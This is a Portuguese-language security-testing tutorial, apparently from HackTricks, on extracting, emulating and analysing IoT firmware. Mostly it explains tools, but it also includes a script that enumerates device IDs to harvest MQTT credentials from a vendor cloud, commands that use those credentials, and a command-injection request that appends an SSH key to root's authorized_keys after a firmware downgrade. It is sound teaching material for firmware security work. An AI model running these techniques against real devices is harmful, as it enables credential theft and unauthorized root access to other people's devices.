# Análise de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introdução**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


Firmware é um software essencial que permite que os dispositivos funcionem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com o qual os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo consiga acessar instruções vitais desde o momento em que é ligado, levando ao carregamento do sistema operacional. Examinar e potencialmente modificar o firmware é um passo crítico na identificação de vulnerabilidades de segurança.

## **Coleta de Informações**

**Coletar informações** é uma etapa inicial crítica para entender a composição de um dispositivo e as tecnologias que ele utiliza. Esse processo envolve a coleta de dados sobre:

- A arquitetura da CPU e o sistema operacional que ele executa
- Especificidades do bootloader
- Layout de hardware e datasheets
- Métricas da base de código e locais das fontes
- Bibliotecas externas e tipos de licença
- Histórico de atualizações e certificações regulatórias
- Diagramas arquiteturais e de fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para esse fim, ferramentas de inteligência de código aberto (OSINT) são inestimáveis, assim como a análise de quaisquer componentes de software open-source disponíveis por meio de processos de revisão manuais e automatizados. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) oferecem análise estática gratuita que pode ser aproveitada para encontrar possíveis problemas.

## **Obtendo o Firmware**

Obter o firmware pode ser feito por vários meios, cada um com seu nível de complexidade:

- **Diretamente** da fonte (desenvolvedores, fabricantes)
- **Construindo** a partir das instruções fornecidas
- **Baixando** de sites oficiais de suporte
- Utilizando consultas **Google dork** para encontrar arquivos de firmware hospedados
- Acessando **cloud storage** diretamente, com ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **updates** via man-in-the-middle
- **Extraindo** do dispositivo por meio de conexões como **UART**, **JTAG** ou **PICit**
- **Sniffing** por requisições de atualização na comunicação do dispositivo
- Identificar e usar **hardcoded update endpoints**
- **Dumping** do bootloader ou da rede
- **Removendo e lendo** o chip de armazenamento, quando tudo mais falhar, usando ferramentas de hardware apropriadas

## Analisando o firmware

Agora que você **tem o firmware**, é necessário extrair informações sobre ele para saber como tratá‑lo. Diferentes ferramentas que você pode usar para isso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se você não encontrar muito com essas ferramentas, verifique a **entropia** da imagem com `binwalk -E <bin>`; se a entropia for baixa, então provavelmente não está criptografada. Se a entropia for alta, é provável que esteja criptografada (ou comprimida de alguma forma).

Além disso, você pode usar essas ferramentas para extrair **arquivos embutidos no firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspecionar o arquivo.

### Obtendo o sistema de arquivos

Com as ferramentas comentadas anteriormente, como `binwalk -ev <bin>`, você deve ter conseguido **extrair o sistema de arquivos**.\\
O Binwalk normalmente o extrai dentro de uma **pasta nomeada conforme o tipo do sistema de arquivos**, que geralmente é um dos seguintes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extração manual do sistema de arquivos

Às vezes, o binwalk **não terá o byte mágico do sistema de arquivos em suas assinaturas**. Nesses casos, use o binwalk para **encontrar o offset do sistema de arquivos e extrair (carve) o sistema de arquivos comprimido** do binário e **extrair manualmente** o sistema de arquivos de acordo com seu tipo usando os passos abaixo.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Execute o seguinte **dd command** para fazer carving do sistema de arquivos Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, o seguinte comando também pode ser executado.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos ficarão no diretório "`squashfs-root`" posteriormente.

- Arquivos CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de arquivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de arquivos ubifs com NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisando Firmware

Uma vez obtido o firmware, é essencial dissecar o mesmo para entender sua estrutura e potenciais vulnerabilidades. Esse processo envolve a utilização de várias ferramentas para analisar e extrair dados valiosos da imagem do firmware.

### Ferramentas de Análise Inicial

Um conjunto de comandos é fornecido para inspeção inicial do arquivo binário (referido como `<bin>`). Esses comandos ajudam a identificar tipos de arquivo, extrair strings, analisar dados binários e entender os detalhes de partição e sistema de arquivos:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para avaliar o estado de criptografia da imagem, a **entropia** é verificada com `binwalk -E <bin>`. Entropia baixa sugere ausência de criptografia, enquanto entropia alta indica possível criptografia ou compressão.

Para extrair **arquivos embutidos**, ferramentas e recursos como a documentação **file-data-carving-recovery-tools** e o **binvis.io** para inspeção de arquivos são recomendados.

### Extraindo o Sistema de Arquivos

Usando `binwalk -ev <bin>`, geralmente é possível extrair o sistema de arquivos, frequentemente para um diretório nomeado de acordo com o tipo de sistema de arquivos (por exemplo, squashfs, ubifs). No entanto, quando o **binwalk** não consegue reconhecer o tipo de sistema de arquivos devido à ausência dos magic bytes, é necessária a extração manual. Isso envolve usar o `binwalk` para localizar o offset do sistema de arquivos, seguido do comando `dd` para esculpir o sistema de arquivos:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Depois, dependendo do tipo de filesystem (por exemplo, squashfs, cpio, jffs2, ubifs), comandos diferentes são usados para extrair manualmente o conteúdo.

### Análise do Sistema de Arquivos

Com o filesystem extraído, começa a busca por falhas de segurança. Atenção é dada a network daemons inseguros, credenciais hardcoded, endpoints de API, funcionalidades de update server, código não compilado, scripts de inicialização e binários compilados para análise offline.

**Locais-chave** e **itens** a inspecionar incluem:

- **etc/shadow** and **etc/passwd** para credenciais de usuário
- Certificados SSL e chaves em **etc/ssl**
- Arquivos de configuração e scripts para potenciais vulnerabilidades
- Binários incorporados para análise adicional
- Servidores web comuns de dispositivos IoT e binários

Várias ferramentas auxiliam em descobrir informações sensíveis e vulnerabilidades dentro do filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) para busca de informações sensíveis
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análise abrangente de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), e [**EMBA**](https://github.com/e-m-b-a/emba) para análise estática e dinâmica

### Verificações de Segurança em Binários Compilados

Tanto o código-fonte quanto os binários compilados encontrados no filesystem devem ser escrutinados em busca de vulnerabilidades. Ferramentas como **checksec.sh** para binários Unix e **PESecurity** para binários Windows ajudam a identificar binários não protegidos que poderiam ser explorados.

## Coleta de cloud config e credenciais MQTT via tokens de URL derivados

Muitos IoT hubs fetcham a configuração por-dispositivo de um cloud endpoint que se parece com:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Durante a análise de firmware você pode encontrar que <token> é derivado localmente do device ID usando um segredo hardcoded, por exemplo:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Esse design permite que qualquer pessoa que descubra um deviceId e o STATIC_KEY reconstrua a URL e puxe o cloud config, frequentemente revelando credenciais MQTT em plaintext e prefixos de tópico.

Fluxo prático:

1) Extrair deviceId dos logs de boot UART

- Conecte um adaptador UART 3.3V (TX/RX/GND) e capture os logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Procure por linhas que imprimem o padrão da URL de cloud config e o endereço do broker, por exemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY e algoritmo do token a partir do firmware

- Carregue binários no Ghidra/radare2 e procure pelo caminho de configuração ("/pf/") ou pelo uso de MD5.
- Confirme o algoritmo (por exemplo, MD5(deviceId||STATIC_KEY)).
- Gere o token no Bash e coloque o digest em maiúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Coletar cloud config e credenciais MQTT

- Monte a URL e obtenha o JSON com curl; analise com jq para extrair segredos:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusar de MQTT em texto simples e ACLs fracas de tópicos (se presentes)

- Use credenciais recuperadas para subscrever tópicos de manutenção e procurar eventos sensíveis:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivos previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam vendor OUI/product/type bytes seguidos por um sufixo sequencial.
- Você pode iterar IDs candidatos, derivar tokens e buscar configs programaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Obtenha sempre autorização explícita antes de tentar enumeração em massa.
- Prefira emulação ou análise estática para recuperar segredos sem modificar o hardware alvo quando possível.


O processo de emular firmware permite a **análise dinâmica** tanto da operação de um dispositivo quanto de um programa individual. Essa abordagem pode enfrentar desafios devido a dependências de hardware ou arquitetura, mas transferir o sistema de arquivos root ou binários específicos para um dispositivo com arquitetura e endianness correspondentes, como um Raspberry Pi, ou para uma máquina virtual pré-construída, pode facilitar testes adicionais.

### Emulação de binários individuais

Para examinar programas individuais, é crucial identificar o endianness (ordem de bytes) e a arquitetura da CPU do programa.

#### Exemplo com arquitetura MIPS

Para emular um binário de arquitetura MIPS, pode-se usar o comando:
```bash
file ./squashfs-root/bin/busybox
```
E para instalar as ferramentas de emulação necessárias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), utiliza-se `qemu-mips`, e para binários little-endian, a escolha seria `qemu-mipsel`.

#### Emulação da Arquitetura ARM

Para binários ARM, o processo é similar, utilizando-se o emulador `qemu-arm` para emulação.

### Emulação de Sistema Completo

Ferramentas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), e outras, facilitam a emulação completa de firmware, automatizando o processo e auxiliando na análise dinâmica.

## Análise Dinâmica na Prática

Nesta etapa, utiliza-se um ambiente de dispositivo real ou emulado para análise. É essencial manter acesso shell ao OS e ao filesystem. A emulação pode não reproduzir perfeitamente as interações com o hardware, exigindo reinícios ocasionais da emulação. A análise deve revisitar o filesystem, explorar páginas web expostas e serviços de rede, e investigar vulnerabilidades no bootloader. Testes de integridade do firmware são críticos para identificar potenciais backdoors.

## Técnicas de Análise em Tempo de Execução

A análise em tempo de execução envolve interagir com um processo ou binário em seu ambiente operacional, usando ferramentas como gdb-multiarch, Frida e Ghidra para definir breakpoints e identificar vulnerabilidades por meio de fuzzing e outras técnicas.

## Exploração Binária e Prova de Conceito

Desenvolver um PoC para vulnerabilidades identificadas requer um entendimento profundo da arquitetura alvo e programação em linguagens de baixo nível. Proteções de runtime binário em sistemas embarcados são raras, mas quando presentes, técnicas como Return Oriented Programming (ROP) podem ser necessárias.

## Sistemas Operacionais Preparados para Análise de Firmware

Sistemas operacionais como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) fornecem ambientes pré-configurados para testes de segurança de firmware, equipados com as ferramentas necessárias.

## OSs Preparados para Analisar Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS é uma distro destinada a ajudar você a realizar security assessment e penetration testing de dispositivos Internet of Things (IoT). Economiza muito tempo ao fornecer um ambiente pré-configurado com todas as ferramentas necessárias carregadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system baseado em Ubuntu 18.04, pré-carregado com ferramentas para teste de segurança de firmware.

## Ataques de Downgrade de Firmware e Mecanismos de Atualização Inseguros

Mesmo quando um fornecedor implementa verificações de assinatura criptográfica para imagens de firmware, **a proteção contra version rollback (downgrade) é frequentemente omitida**. Quando o boot- ou recovery-loader verifica apenas a assinatura com uma chave pública embutida, mas não compara a *versão* (ou um contador monotônico) da imagem sendo gravada, um atacante pode instalar legitimamente um **firmware mais antigo e vulnerável que ainda possui uma assinatura válida** e assim reintroduzir vulnerabilidades já corrigidas.

Fluxo típico de ataque:

1. **Obter uma imagem assinada mais antiga**
* Pegue-a do portal público de downloads do fornecedor, CDN ou site de suporte.
* Extraia-a de aplicativos companion para mobile/desktop (por exemplo dentro de um Android APK em `assets/firmware/`).
* Recupere-a de repositórios de terceiros como VirusTotal, arquivos da Internet, fóruns, etc.
2. **Enviar ou servir a imagem ao dispositivo** via qualquer canal de atualização exposto:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Muitos dispositivos IoT de consumo expõem endpoints HTTP(S) *unauthenticated* que aceitam blobs de firmware codificados em Base64, decodificam-nos server-side e acionam recovery/upgrade.
3. Após o downgrade, explore uma vulnerabilidade que foi corrigida na release mais recente (por exemplo um filtro de command-injection que foi adicionado posteriormente).
4. Opcionalmente grave a imagem mais recente de volta ou desative atualizações para evitar detecção uma vez que a persistência seja obtida.

### Exemplo: Command Injection Após Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Na firmware vulnerável (rebaixada), o parâmetro `md5` é concatenado diretamente em um comando shell sem sanitização, permitindo a injeção de comandos arbitrários (aqui – habilitando acesso root por chave SSH). Versões posteriores do firmware introduziram um filtro básico de caracteres, mas a ausência de proteção contra downgrade torna a correção inútil.

### Extraindo Firmware de Apps Móveis

Muitos fornecedores incluem imagens completas de firmware dentro de seus aplicativos móveis companheiros para que o app possa atualizar o dispositivo via Bluetooth/Wi-Fi. Esses pacotes costumam ser armazenados sem criptografia no APK/APEX sob caminhos como `assets/fw/` ou `res/raw/`. Ferramentas como `apktool`, `ghidra`, ou até mesmo o simples `unzip` permitem extrair imagens assinadas sem precisar tocar no hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista de Verificação para Avaliar a Lógica de Atualização

* O transporte/autenticação do *update endpoint* está adequadamente protegido (TLS + autenticação)?
* O dispositivo compara **version numbers** ou um **monotonic anti-rollback counter** antes de gravar?
* A imagem é verificada dentro de uma secure boot chain (e.g. signatures checked by ROM code)?
* O userland code realiza verificações adicionais de sanidade (e.g. allowed partition map, model number)?
* Fluxos de atualização *partial* ou *backup* estão reutilizando a mesma lógica de validação?

> 💡  Se qualquer um dos itens acima estiver ausente, a plataforma provavelmente é vulnerável a rollback attacks.

## Firmware vulnerável para praticar

Para praticar a descoberta de vulnerabilidades em firmware, use os seguintes projetos de firmware vulneráveis como ponto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referências

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Treinamento e Certificação

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
